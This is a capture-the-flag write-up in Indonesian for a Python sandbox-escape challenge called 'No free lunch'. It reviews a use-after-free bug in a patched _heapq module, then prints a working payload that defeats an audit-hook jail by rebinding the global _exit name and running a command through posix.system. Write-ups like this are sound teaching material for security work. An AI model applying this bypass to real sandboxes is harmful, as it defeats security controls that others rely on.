# No free lunch

Challenge ini kelihatannya seperti pyjail dengan satu import yang diizinkan, yaitu `heapq`. Deskripsinya juga sengaja mengarahkan kita ke patch CPython yang disediakan. Setelah dibaca, memang ada banyak patch aneh yang merusak mekanisme leak address, `id()`, `repr()`, hash pointer, dan beberapa bagian internal lain. Awalnya ini terlihat seperti challenge memory corruption di CPython. Memang ada bug use-after-free di `_heapq`, tapi ternyata challenge ini bisa diselesaikan jauh lebih simpel.

## Recon

File penting:

- `src/server.py`
- `src/0001-Rewind-in-time.patch`
- `src/0002-Hopefully-remove-free-lunch.patch`

Behavior service:

1. Service menerima input Python line-by-line sampai ketemu `EOF`.
2. Lalu service membuat file temporary yang isinya:

```python
import heapq # the only import you'll need today
from sys import addaudithook
from os import _exit
addaudithook(lambda x,y:_exit(0))
```

3. Setelah itu input kita ditambahkan ke file tersebut.
4. Script dijalankan dengan custom CPython hasil patch.

Jadi inti jail-nya bukan memblokir builtins atau eval, tapi memasang audit hook yang langsung memanggil `_exit(0)` saat ada event audit.

## Analisis patch

Patch `0001-Rewind-in-time.patch` mengubah `_heapq.heappushpop()`:

```c
PyObject* top = PyList_GET_ITEM(heap, 0);
// Py_INCREF(top);
cmp = PyObject_RichCompareBool(top, item, Py_LT);
// Py_DECREF(top);
```

Ini jelas bug lifetime object. Jika selama `__lt__` heap dimodifikasi dan elemen pertama hilang, `top` bisa menjadi dangling pointer. Saya sempat validasi ini lokal dan memang bisa memicu crash di CPython custom tersebut.

Tapi setelah melihat `server.py`, ada hal yang jauh lebih penting: audit hook dipasang sebagai lambda Python biasa, bukan C callback khusus, dan lambda itu mengambil nama `_exit` dari global scope modul.

Baris kritisnya:

```python
from os import _exit
addaudithook(lambda x,y:_exit(0))
```

Di Python, global name di dalam function/lambda di-resolve saat function dipanggil, bukan saat function dibuat. Artinya, kalau kita menimpa `_exit` setelah hook dipasang, lambda itu tidak lagi memanggil fungsi `os._exit` asli, tetapi memanggil value baru yang kita taruh di global `_exit`.

Itu berarti kita bisa mematikan seluruh jail hanya dengan:

1. Menyimpan dulu referensi ke module `posix` lewat `_exit.__self__`
2. Menimpa `_exit` menjadi fungsi no-op
3. Menjalankan command yang kita mau lewat `posix.system`

## Kenapa payload pertama harus hati-hati

Kalau langsung menulis:

```python
_exit=lambda x:None
p=_exit.__self__
```

itu salah, karena setelah `_exit` ditimpa jadi function Python biasa, object itu tidak punya atribut `__self__`.

Urutan yang benar:

```python
p=_exit.__self__
_exit=lambda x:None
p.system('/challenge/read_flag')
```

`_exit.__self__` di sini adalah module `posix` built-in. Dari situ kita bisa memanggil `system()` langsung.

## Payload final

Payload yang dikirim ke service:

```python
p=_exit.__self__
_exit=lambda x:None
p.system('/challenge/read_flag')
EOF
```

Begitu `system()` memicu audit event, hook tetap dipanggil, tetapi sekarang `_exit(0)` sudah berubah menjadi lambda no-op. Jadi proses tidak mati, command jalan normal, dan binary setuid `/challenge/read_flag` mencetak flag.

## Solver

Solver final ada di [exploit.py](/home/kali/ctf/GPNCTF2026/pwn/NofreeLunch/no-free-lunch/exploit.py).

Jalankan dengan:

```bash
source /home/kali/tools/ctf/bin/activate
python exploit.py
```

## Flag

```text
GPNCTF{sO_M4Ny_wAys_TO_LeAk_1N_N0Rma1_PyThOn_UAf_OlD_8UT_G0Ld}
```

## Catatan

Challenge ini punya surface memory corruption yang nyata di `_heapq`, jadi sangat masuk akal kalau solver awal mengarah ke UAF. Tetapi bug yang benar-benar fatal justru lebih sederhana: audit hook Python-level yang mengandalkan nama global yang bisa ditimpa ulang dari script user.
